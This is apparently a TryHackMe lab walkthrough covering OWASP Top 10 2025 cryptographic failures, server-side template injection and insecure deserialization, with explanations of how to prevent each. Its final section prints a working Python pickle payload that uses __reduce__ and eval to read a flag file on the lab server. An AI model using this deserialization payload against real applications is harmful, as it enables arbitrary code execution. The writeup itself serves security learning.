---
title: "OWASP Top 10 2025: Insecure Data Handling (TryHackMe)"
datePublished: Tue Nov 25 2025 19:40:43 GMT+0000 (Coordinated Universal Time)
cuid: cmiezdodg000402l6bbu236wg
slug: owasp-top-10-2025-insecure-data-handling-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1764098915883/228cbf3b-10b8-494d-9cf8-b4af0ef829d2.png
tags: owasp-top-10, ctf-writeup, tryhackme-walkthrough, insecure-deserialization

---

Understanding modern web vulnerabilities is essential for anyone working in cybersecurity or software development. This room builds on that foundation by guiding you through three critical OWASP Top 10 (2025) categories that frequently lead to real-world breaches. Through clear explanations and practical exercises, you’ll not only learn *what* these vulnerabilities are, but also *why* they matter and how attackers take advantage of them.

## Introduction

This room will introduce you to 3 elements of the OWASP Top 10 list (2025). In this room, you will learn about the elements relating to application behaviour and user input. We will cover these vulnerabilities briefly, how to prevent them, and finally, you will practice exploiting these vulnerabilities:

* A04: Cryptographic Failures
    
* A05: Injection
    
* A08: Software or Data Integrity Failures
    

## A04: Cryptographic Failures

Cryptographic failiures makes yet another appearence on this OWASP Top 10 list. Let's explore what this exactly and some mitigation steps below.

## **What are Cryptographic Failures?**

Cryptographic failures happen when sensitive data isn't adequately protected due to lack of encryption, faulty implementation, or insufficient security measures. This includes storing passwords without hashing, using outdated or weak algorithms (such as MD5, SHA1, or DES), exposing encryption keys, or failing to secure data during transmission.

An incredible example of this is an application or service "rolling their own cryptography", rather than using well-established, vetted, and verifiably secure encryption algorithms.

## **How to Prevent Cryptographic Failures**

Preventing cryptographic failures starts with choosing strong, modern algorithms and implementing them properly. Sensitive information such as passwords should be hashed using robust, slow hashing functions like bcrypt, scrypt, or Argon2. When encrypting data, avoid creating your own algorithms; instead, rely on trusted, industry-standard libraries.

Never embed access credentials (i.e., to a third-party service) in source code, configuration files, or repositories. Instead, use secure key management systems or environments specifically designed for storing secrets.

## **Practical**

The practical for this task is located at [http://MACHINE\_IP:8001](http://machine_ip:8001/). This web app demonstrates a "note sharing" service that uses a weak, shared derivative key to protect the notes.

Follow the steps on the web application to unlock all notes and retrieve a flag.

## **Recommended TryHackMe Content**

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content:

* [Cryptographic Failures](https://tryhackme.com/module/cryptofailures) Module
    

### Answer the questions below

Decrypt the encrypted notes. One of them will contain a flag value. What is it?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763710350943/5191665a-2eba-4a15-81e3-8e38dd90ef49.png align="center")

## A05: Injection

Injection has been a long-standing feature on the OWASP Top 10 list, and it is no surprise. Injection remains a classic example of web exploitation.

## **What is Injection?**

Injection occurs when an application takes user input and mishandles it. Instead of processing the input securely, the application passes it directly into a system that can execute commands or queries, such as a database, a shell, a templating engine or API.

You are likely familiar with SQL Injection, where an attacker inserts an SQL query into an application's logic, such as a login form, which then gets processed by the database. This happens when the web application fails to sanitise user input and instead uses it to construct the query. For instance, taking the "username" input on a login form and directly using it to query the database.

The following are some classic examples of injection that you may be familiar with:

* SQL Injection
    
* Command Injection
    
* AI Prompts
    
* Server Side Template Injection (SSTI)
    

Unfortunately, even in 2025, these types of attacks remain relevant, as evidenced by the inclusion of injection on the OWASP top ten list, not just once in 2021, but twice by 2025. Injection is of high severity and should be treated accordingly.

## **How to Prevent Injection**

Preventing injection starts by ensuring that user input is always treated as untrusted. Rather than parsing directly, instead, take elements of the input for querying. For SQL queries, this means using prepared statements and parameterised queries instead of building queries through string concatenation. For OS commands, avoid functions that pass input directly to the system shell, and instead rely on safe APIs and processes that don’t invoke the shell at all.

Input validation and sanitisation play a crucial role in preventing these types of attack. Escape dangerous characters, enforce strict data types and filter before the application even processes the input.

## **Practical**

Today's practical will showcase command injection. This example illustrates Server Side Template Injection (SSTI). You will abuse an application's ability to render dynamic content to retrieve a flag stored on the machine hosting the application.

You can access this portion of the practical on [http://MACHINE\_IP:8000](http://machine_ip:8000/).

## **Recommended TryHackMe Content**

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content:

* [Injection Attacks](https://tryhackme.com/module/injection-attacks) Module
    
* [Command Injection](https://tryhackme.com/room/oscommandinjection)
    

### Answer the questions below

Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763710425581/cc431293-e92c-4618-85d2-1b7973bca6b4.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763710440240/ee53828d-2bf6-4016-b9a4-4fba77740d63.png align="center")

## A08: Software or Data Integrity Failures

Again, Software or Data Integrity failures have been a long-standing feature on the OWASP Top 10 list, featuring twice over the last two releases. Let's explore this a bit further below.

## **What Are Software or Data Integrity Failures?**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1763110949029.svg align="left")

Software or Data Integrity Failures occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin. This includes trusting software updates without verification, loading scripts or configuration files from untrusted sources, failing to validate data that impacts application logic, or accepting data such as binaries, templates, or JSON files without confirming whether it has been altered.

## **How to Avoid Software & Data Integrity Failures**

Preventing these failures begins with establishing trust boundaries. Applications should never assume that code, updates, or key pieces of data are legitimate and automatically trusted; their integrity must be verified. This involves using methods such as cryptographic checks (like checksums) for update packages and ensuring that only trusted sources can modify critical artefacts.

Additionally, for applications, integrity and trust boundaries should also be within build processes such as CI/CD.

## **Practical**

This practical will demonstrate a deserialization attack in Python. You can access this practical on [http://MACHINE\_IP:8002](http://machine_ip:8002/).

Follow the steps in the practical to generate and provide some malicious input to the web application.

## **Recommended TryHackMe Content**

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content:

* [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation)
    
* [Supply Chain Attack: Lottie](https://tryhackme.com/room/supplychainattacks)
    

### Answer the questions below

Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application.

What are the contents of flag.txt?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763710493397/a5b2d939-71c2-43eb-b822-5b123bd62535.png align="center")

Create a Python file, then copy the code provided in the solution section of the web page

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)

# Copy the output and paste it into the form
```

`python3 file.py`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763712497036/5c98deef-bf19-46a7-8d9c-7cec9ae9475f.jpeg align="center")

Copy the output in order to deserialize in order to find the fla

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1763711450513/5f778d54-e90c-4803-9c3f-2429999e14d0.png align="center")

  
By completing the exercises in this room, you’ve gained hands-on experience with several high-impact vulnerabilities that continue to challenge organisations year after year. While each category—cryptographic failures, injection flaws, and integrity failures—affects applications in different ways, they share a common theme: **trusting user input or unverified data can be dangerous**. Strengthening applications requires careful validation, secure design choices, and thoughtful handling of sensitive information.

As you continue your cybersecurity journey, these foundational concepts will appear again and again—whether in penetration testing, secure coding, SOC analysis, or real-world incident response. Keep practising, stay curious, and build the habit of questioning how data flows and where trust boundaries exist.